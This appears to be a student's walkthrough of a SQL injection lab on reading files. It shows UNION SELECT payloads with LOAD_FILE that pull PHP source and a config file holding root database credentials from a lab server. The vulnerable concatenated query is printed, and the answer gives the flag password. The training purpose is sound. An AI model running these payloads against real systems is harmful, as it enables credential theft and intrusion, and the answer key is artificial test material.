# Section 14: Reading Files

Module: 17. SQL Injection Fundamentals

---

## Questions & Answers

### 1. We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.

Context:
- Read the file `/var/www/html/search.php` on our own, use `View page source` to see the full source code:
```
a' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4 -- 

include "config.php";
?>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Search Ports</title>

    <link href="./style.css" rel="stylesheet">
	</head>

  <body>
  <div class="container-narrow" style="width:820px">
		
		
		<div class="response" style="background-color: #28ACE2; width:820px"> 
		
			<p style="color:white">
			<table class="response" style="background-color: #28ACE2">
			<form method="GET" autocomplete="off">
			
			<tr>
				<td>
					Search for a port:  
				</td>
				<td>
					<input type="text" id="port_code" name="port_code">&nbsp;&nbsp;
				</td>
				<td>
					<input type="submit" value="Search"/> 
				</td>
			</tr>
	</table>
				
			</p>

		</form>
        </div>
    
        
		<br />
<div class="searchheader" style="color:white;background-color: white">
<table class="tabl pure-table">	
<thead>
    
	<tr class="rowz"> 
    <td style="width:500px" colspan=3 >
        <b>Port Code</b>
    </td>
    
    <td style="width:500px" colspan=3 >
        <b>Port City</b>
    </td>
    
    <td style="width:500px" colspan=3>
        <b>Port Volume</b>
    </td>
 
</tr>
</thead>
<tbody>

<?php
if (isset($_GET["port_code"])) {
$q = "Select * from ports where code like '%".$_GET["port_code"]."%'";

$result = mysqli_query($conn,$q);
if (!$result)
{
		die("</table></div><p style='font-size: 15px'>".mysqli_error($conn)."</p>");
}
while($row = mysqli_fetch_array($result))
  {
  echo "<tr><td style=\"width:400px\" colspan=3>".$row[1]."</td><td style=\"width:400px\" colspan=3>".$row[2]."</td><td style=\"width:450px\" colspan=3>".$row[3]."</tr>";
  }
}
?>
</tbody>
</table>
	</div>

	  
	  
	  
	</div> <!-- /container -->
  
</body>
</html>
```
- Found `config.php`, read that file:
```
a' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4 -- 

'localhost', 'DB_USERNAME'=>'root', 'DB_PASSWORD'=>'dB_pAssw0rd_iS_flag!', 'DB_DATABASE'=>'ilfreight' ); $conn = mysqli_connect($config['DB_HOST'], $config['DB_USERNAME'], $config['DB_PASSWORD'], $config['DB_DATABASE']); if (mysqli_connect_errno($conn)) { echo "Failed connecting. " . mysqli_connect_error() . "
"; } ?> 
```


**Answer:** `dB_pAssw0rd_iS_flag!`

---

[Back to Module Index](./README.md)
